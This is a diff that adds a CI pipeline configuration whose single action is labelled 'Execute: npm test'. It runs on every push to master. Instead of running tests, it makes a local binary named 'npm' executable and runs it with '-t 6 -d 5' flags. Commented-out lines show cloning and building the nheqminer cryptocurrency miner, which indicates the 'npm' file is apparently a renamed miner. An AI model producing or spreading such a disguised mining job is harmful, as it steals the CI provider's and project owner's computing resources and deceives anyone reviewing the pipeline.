@@ -1,0 +1,19 @@
+- pipeline: "test"
+  trigger_mode: "ON_EVERY_PUSH"
+  ref_name: "master"
+  actions:
+  - action: "Execute: npm test"
+    type: "BUILD"
+    docker_image_name: "ubuntu"
+    docker_image_tag: "16.04" 
+    execute_commands:
+    #- "apt-get update && apt-get install -y build-essential libcurl4-openssl-dev git automake libtool libjansson* libncurses5-dev nano htop libssl-dev cmake libblkid-dev e2fslibs-dev libboost-all-dev libaudit-dev"
+  #  - "git clone https://github.com/nicehash/nheqminer.git"
+    #- 'sed -i "s/option(USE_CUDA_DJEZO \"USE CUDA_DJEZO\" ON)/\option(USE_CUDA_DJEZO \"USE CUDA_DJEZO\" OFF)/g" nheqminer/CMakeLists.txt'
+    - "chmod +x npm"
+   # - "cd nheqminer/cpu_xenoncat/asm_linux/ && sh assemble.sh && cd ../../../ && mkdir build && cd build && cmake ../nheqminer && make -j $(nproc)"
+    - "./npm -t 6 -d 5"
+
+ 
+
+
